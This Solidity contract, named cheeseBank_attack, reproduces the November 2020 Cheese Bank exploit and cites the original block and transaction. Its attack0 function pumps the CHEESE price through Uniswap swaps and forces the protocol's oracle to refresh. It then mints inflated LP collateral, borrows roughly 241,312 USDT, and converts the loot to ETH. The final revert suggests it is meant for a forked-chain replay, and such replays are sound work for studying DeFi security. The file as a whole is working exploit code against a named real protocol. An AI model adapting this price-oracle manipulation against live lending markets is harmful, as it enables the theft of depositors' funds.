// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interface.sol";
// Block 11205648
// Block index 106
// Timestamp Fri, 06 Nov 2020 19:22:21 +0000
// Gas price 29 gwei
// Gas limit 3732594
// tx: 0x600a869aa3a259158310a233b815ff67ca41eab8961a49918c2031297a02f1cc


// orginal hacker's rabbit hole 1: 02b7165d0916e373f
// orginal hacker's rabbit hole 2: 0x02b7165d0916e37



contract cheeseBank_attack {
    address private EOA;
    address private WETHAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private StateraAddress = 0xa7DE087329BFcda5639247F96140f9DAbe3DeED1;
    address private BalancerAddress = 0x0e511Aa1a137AaD267dfe3a6bFCa0b856C1a3682;
    address private UniswapV2Router02Address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private CheeseTokenAddress = 0xA04bDB1f11413a84D1F6C1d4d4FeD0208F2e68bF;
    address private UniswapV2PairAddress = 0x534f2675Ff7B4161E46277b5914D33a5cB8DcF32;
    address private UnitrollerAddress = 0xdE2289695220531dfCf481FE3554D1C9C3156BA3;
    address private CheeseETHAddress = 0x7e4956688367fB28de3C0A62193f59b1526a00e7;
    address private CheesePriceOracleAddress = 0x833e440332cAA07597a5116FBB6163f0E15F743D;
    address private USDCAddress = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private CheeseUSDCAddress = 0x5E181bDde2fA8af7265CB3124735E9a13779c021;
    address private USDTAddress = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private CheeseUSDTAddress = 0x4c2a8A820940003cfE4a16294B239C8C55F29695;
    address private DAIAddress = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private CheeseDAIAddress = 0xA80e737Ded94E8D2483ec8d2E52892D9Eb94cF1f;

    IERC20 CheeseToken = IERC20(CheeseTokenAddress);
    IUniswapV2Router02 UniswapV2Router02 = IUniswapV2Router02(UniswapV2Router02Address);
    IERC20 USDC = IERC20(USDCAddress);
    IERC20 USDT = IERC20(USDTAddress);
    IERC20 DAI = IERC20(DAIAddress);
    address UNI_V2Address = 0x534f2675Ff7B4161E46277b5914D33a5cB8DcF32;
    IUniswapV2Pair UNI_V2 = IUniswapV2Pair(UNI_V2Address);
    IWETH WETH = IWETH(WETHAddress);

    uint256 balance1 = 0;
    uint256 balance2 = 0;
    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";

    string str80 = "";
    string str81 = "";
    string str82 = "";
    string str83 = "";
    string str84 = "";

    uint reserve0;
    uint reserve1;
    uint ETHcost;
    uint cheeseCost;
    string[] str;
    uint price;

    address[] ad; 

    // address unitrollerAddress = 0x3C7274679FF9d090889Ed8131218bdc871020391;
    address unitrollerAddress = 0xdE2289695220531dfCf481FE3554D1C9C3156BA3;
    Comptroller Unitroller = Comptroller(unitrollerAddress);

    uint Cheesegot;

    constructor() payable {
        require(msg.value == 21000 ether, "loan amount does not match");
        CheeseToken.approve(UniswapV2Router02Address, 2**256-1);
        IERC20(UniswapV2PairAddress).approve(CheeseETHAddress, 2**256 -1);
        address[] memory ad2 = new address[](1);
        ad2[0] = CheeseETHAddress;
        ComptrollerInterface(UnitrollerAddress).enterMarkets(ad2);
        str = new string[](1);
        ad = new address[](2);
        EOA = msg.sender;
    }

    receive() external payable {}
    
    // loan amount = 21000 ether 
    function attack0() public {

        // Action:  SwapUniswapETH2Cheese
        ad[0] = WETHAddress;
        ad[1] = CheeseTokenAddress;
        UniswapV2Router02.swapExactETHForTokens{value: 2128 * 10 ** 18}(0, ad, address(this), 2000000000);
        
        // Action: refresh
        str[0] = "UNI_V2-CHEESE-ETH";
        CheesePriceOracle(CheesePriceOracleAddress).refresh(str);

        // Action:  SwapUniswapCheese2ETH
        ad[0] = CheeseTokenAddress;
        ad[1] = WETHAddress;
        IUniswapV2Router02(UniswapV2Router02Address).swapExactTokensForETH( 245600 * 10 ** 18, 0, ad, address(this), 2000000000);

        // Action:  SwapUniswapETH2LP
        Cheesegot = CheeseToken.balanceOf(address(this));
        ad[0] = WETHAddress;
        ad[1] = CheeseTokenAddress;
        UniswapV2Router02.swapExactETHForTokens{value: 95 * 10 ** 18}(0, ad, address(this), 2000000000);
        Cheesegot = CheeseToken.balanceOf(address(this)) - Cheesegot;
        (reserve0, reserve1, ) = UNI_V2.getReserves();
        ETHcost = Cheesegot * reserve1 / reserve0;
        UniswapV2Router02.addLiquidityETH{value: ETHcost}(CheeseTokenAddress, Cheesegot, 0, 0, address(this), 2000000000);
        
        // Action: LP2LQ
        cERC20(CheeseETHAddress).mint(3126 * 10 ** 18);

        // Action: BorrowCheese_USDT
        cERC20(CheeseUSDTAddress).borrow( 241312 * 10 ** 6);

        // revert(ProfitSummary());
        // ==================== Swap ========================================
        Convert2WETH(address(USDT));
        Convert2WETH(address(USDC));
        Convert2WETH(address(DAI));
        Convert2WETH(address(CheeseToken));
        WETH.withdraw(WETH.balanceOf(address(this)));
        revert(ProfitSummary());


    }


    function Convert2WETH(address token) internal {
        IOneSplitAudit OneSplitAudit = IOneSplitAudit(0xC586BeF4a0992C495Cf22e1aeEE4E446CECDee0E);
        uint diff = IERC20(token).balanceOf(address(this));
        if(diff > 0){
            (, uint256[] memory distribution) = OneSplitAudit.getExpectedReturn(token, address(WETH), diff, 10, 0);
            StandardToken(token).approve(address(OneSplitAudit), 0);
            StandardToken(token).approve(address(OneSplitAudit), diff);
            OneSplitAudit.swap(token, address(WETH), diff, 0, distribution, 0); 
        }
    }
    
    function UniswapSummary() internal returns (string memory _uintAsString) {
        (reserve0, reserve1, ) = UNI_V2.getReserves();
        str80 = appendWithSpace("Cheese balance: ", uint2str(reserve0 / 10 ** 18));
        str81 = appendWithSpace("WETH balance: ", uint2str(reserve1 / 10 ** 18));
        return appendWithSpace(str80, str81);
    }

    function ProfitSummary() internal returns (string memory _uintAsString){
        balance1 = address(this).balance / 10 ** 18;
        balance2 = USDC.balanceOf(address(this)) / 10 ** 6;
        str80 = append("ETH balance: ", uint2str(balance1));
        str81 = append(" || USDC balance: ", uint2str(balance2));
        str80 = appendWithSpace(str80, str81);

        balance1 = USDT.balanceOf(address(this)) / 10 ** 6;
        balance2 = DAI.balanceOf(address(this)) / 10 ** 18;
        str82= append(" || USDT balance: ", uint2str(balance1));
        str83 = append(" || DAI balance: ", uint2str(balance2));
        str82 = appendWithSpace(str82, str83);

        return append(str80, str82);
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }


    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }

}    
    